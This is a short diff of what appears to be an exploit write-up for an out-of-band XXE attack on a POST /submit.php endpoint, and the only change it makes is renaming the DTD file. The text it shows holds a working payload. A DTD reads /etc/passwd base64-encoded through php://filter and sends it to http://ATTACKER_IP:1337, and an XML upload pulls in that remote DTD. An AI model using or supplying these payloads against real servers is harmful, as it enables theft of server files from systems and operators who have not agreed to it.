@@ -85,7 +85,7 @@ Use the payload below for POST /submit.php , replacing ATTACKER_IP with your IP:
     *************************************************************************************/
 
 The server will connect to your web server, confirming the vulnerability. 
-To exfiltrate data, create a DTD file (sample.dtd) with the following content:
+To exfiltrate data, create a DTD file (XXE_exploit.dtd) with the following content:
     /*************************************************************************************
     * <!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
     * <!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
@@ -95,7 +95,7 @@ To exfiltrate data, create a DTD file (sample.dtd) with the following content:
 Modify your payload to reference the DTD file:
     /*************************************************************************************
     * <?xml version="1.0" encoding="UTF-8"?>
-    * <!DOCTYPE upload SYSTEM "http://ATTACKER_IP:1337/sample.dtd">
+    * <!DOCTYPE upload SYSTEM "http://ATTACKER_IP:1337/XXE_exploit.dtd">
     * <upload>
     *     <file>&exfil;</file>
     * </upload>
